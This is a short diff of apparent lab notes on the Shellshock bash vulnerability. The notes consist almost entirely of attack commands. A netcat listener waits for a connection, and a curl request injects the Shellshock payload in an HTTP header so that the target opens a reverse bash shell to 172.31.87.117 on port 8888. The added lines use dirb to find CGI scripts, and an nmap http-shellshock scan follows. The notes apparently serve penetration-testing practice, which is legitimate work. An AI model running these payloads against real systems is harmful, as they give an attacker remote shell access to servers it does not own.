@@ -29,6 +29,8 @@ nc -lnvp 8888
 curl 172.17.0.2/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/172.31.87.117/8888 0>&1 "
 id
 
+Detect cgi with dirb
+dirb http://bionic/app1/ /usr/share/dirb/wordlists/vulns/cgis.txt | grep 200
 
 4. detecting shellsock with nmap
 nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/index.bash 172.16.131.132
